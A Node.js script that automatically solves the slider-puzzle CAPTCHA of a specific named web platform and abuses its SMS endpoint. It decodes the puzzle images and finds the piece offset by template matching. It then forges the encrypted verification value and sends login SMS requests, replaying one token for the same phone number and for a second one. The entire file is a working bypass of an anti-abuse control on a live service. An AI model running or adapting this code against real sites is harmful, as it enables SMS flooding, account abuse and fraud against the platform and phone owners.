
import crypto from 'node:crypto';
import zlib from 'node:zlib';

const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36';

function decodePNG(buf){
  if (buf.readUInt32BE(0)!==0x89504e47) throw new Error('not png');
  let off=8, w=0,h=0,depth=0,ctype=0, idat=[], plte=null;
  while(off<buf.length){
    const len=buf.readUInt32BE(off), type=buf.toString('ascii',off+4,off+8);
    const data=buf.subarray(off+8, off+8+len);
    if(type==='IHDR'){ w=data.readUInt32BE(0); h=data.readUInt32BE(4); depth=data[8]; ctype=data[9]; }
    else if(type==='IDAT') idat.push(data);
    else if(type==='PLTE') plte=data;
    else if(type==='IEND') break;
    off += 12+len;
  }
  if(depth!==8) throw new Error('depth '+depth);
  const raw=zlib.inflateSync(Buffer.concat(idat));
  const ch = ctype===6?4: ctype===2?3: ctype===0?1: ctype===4?2: ctype===3?1:null;
  if(!ch) throw new Error('ctype '+ctype);
  const stride=w*ch;
  const out=Buffer.alloc(w*h*4);
  let prev=Buffer.alloc(stride), p=0;
  for(let y=0;y<h;y++){
    const ft=raw[p++]; const line=Buffer.from(raw.subarray(p,p+stride)); p+=stride;
    for(let i=0;i<stride;i++){
      const a= i>=ch? line[i-ch]:0, b=prev[i], c= i>=ch? prev[i-ch]:0;
      let v=line[i];
      if(ft===1) v=(v+a)&255; else if(ft===2) v=(v+b)&255; else if(ft===3) v=(v+((a+b)>>1))&255;
      else if(ft===4){ const pp=a+b-c, pa=Math.abs(pp-a), pb=Math.abs(pp-b), pc=Math.abs(pp-c);
        v=(v+(pa<=pb&&pa<=pc?a:pb<=pc?b:c))&255; }
      line[i]=v;
    }
    prev=line;
    for(let x=0;x<w;x++){
      const o=(y*w+x)*4, s=x*ch;
      if(ctype===6){ out[o]=line[s];out[o+1]=line[s+1];out[o+2]=line[s+2];out[o+3]=line[s+3]; }
      else if(ctype===2){ out[o]=line[s];out[o+1]=line[s+1];out[o+2]=line[s+2];out[o+3]=255; }
      else if(ctype===3){ const idx=line[s]*3; out[o]=plte[idx];out[o+1]=plte[idx+1];out[o+2]=plte[idx+2];out[o+3]=255; }
      else if(ctype===0){ out[o]=out[o+1]=out[o+2]=line[s]; out[o+3]=255; }
      else { out[o]=out[o+1]=out[o+2]=line[s]; out[o+3]=line[s+1]; }
    }
  }
  return {w,h,data:out};
}

function aesEncrypt(plain, key){
  const k=Buffer.from(key,'utf8');
  const c=crypto.createCipheriv(k.length===16?'aes-128-ecb':k.length===24?'aes-192-ecb':'aes-256-ecb', k, null);
  c.setAutoPadding(true);
  return Buffer.concat([c.update(Buffer.from(plain,'utf8')), c.final()]).toString('base64');
}

function solve(orig, jig){
  const O=decodePNG(orig), J=decodePNG(jig);
  const W=O.w, H=O.h;
  // alpha bbox of jigsaw
  let x0=1e9,x1=-1,y0=1e9,y1=-1;
  for(let y=0;y<J.h;y++)for(let x=0;x<J.w;x++){
    if(J.data[(y*J.w+x)*4+3]>200){ if(x<x0)x0=x; if(x>x1)x1=x; if(y<y0)y0=y; if(y>y1)y1=y; }
  }
  const pw=x1-x0+1, ph=y1-y0+1;
  const gray=(img,x,y)=>{const o=(y*img.w+x)*4;return (img.data[o]*0.299+img.data[o+1]*0.587+img.data[o+2]*0.114);};
  let best=1e18,bestX=-1;
  for(let dx=0; dx<=W-pw; dx++){
    let sad=0,cnt=0;
    for(let y=y0;y<=y1;y+=2)for(let x=x0;x<=x1;x+=2){
      if(J.data[(y*J.w+x)*4+3]<=200) continue;
      const jx=x-x0, jy=y-y0, ox=dx+jx;
      if(ox<0||ox>=W) continue;
      sad+=Math.abs(gray(J,x,y)-gray(O,ox,y)); cnt++;
    }
    if(cnt>50){ const score=sad/cnt; if(score<best){best=score;bestX=dx;} }
  }
  return {x:bestX, y:y0, pw, ph, score:Math.round(best*100)/100};
}

async function j(p){ const r=await p; const t=await r.text(); try{return {status:r.status, body:JSON.parse(t)};}catch{return {status:r.status, body:t.slice(0,300)};} }
const B='https://platform.huimengi.com';
const H={'Content-Type':'application/json','User-Agent':UA,'Origin':B,'Referer':B+'/login/'};
const uid=crypto.randomUUID();

const cap=await j(fetch(B+'/api/auth/captcha/behavior?'+new URLSearchParams({captchaType:'blockPuzzle',clientUid:uid,ts:String(Date.now())}),{headers:H}));
const d=cap.body?.data||{};
console.log('captcha:', JSON.stringify({code:cap.body?.code,token:d.token,key:d.secretKey,rep:d.repCode}));
const pos=solve(Buffer.from(d.originalImageBase64,'base64'), Buffer.from(d.jigsawImageBase64,'base64'));
console.log('solved:', pos);
const pointJson=aesEncrypt(JSON.stringify({x:pos.x,y:5}), d.secretKey);
const check=await j(fetch(B+'/api/auth/captcha/behavior',{method:'POST',headers:H,body:JSON.stringify({captchaType:'blockPuzzle',token:d.token,pointJson,clientUid:uid,ts:Date.now()})}));
console.log('check:', JSON.stringify(check.body?.repCode), JSON.stringify(check.body?.repData));
const cv=aesEncrypt(d.token+'---'+pointJson, d.secretKey);
console.log('captchaVerification:', cv);
console.log('check-raw:', JSON.stringify(check.body).slice(0,300));
const t1=Date.now();
const r1=await j(fetch(B+'/api/auth/sms/send',{method:'POST',headers:H,body:JSON.stringify({phone:'19900000000',scene:'login',captchaVerification:cv})}));
console.log('sms#1 valid captcha+valid phone ->', JSON.stringify(r1.body), (Date.now()-t1)+'ms');
const r2=await j(fetch(B+'/api/auth/sms/send',{method:'POST',headers:H,body:JSON.stringify({phone:'19900000000',scene:'login',captchaVerification:cv})}));
console.log('sms#2 replay same captchaVerification ->', JSON.stringify(r2.body));
const r3=await j(fetch(B+'/api/auth/sms/send',{method:'POST',headers:H,body:JSON.stringify({phone:'19900000001',scene:'login',captchaVerification:cv})}));
console.log('sms#3 replay other phone ->', JSON.stringify(r3.body));
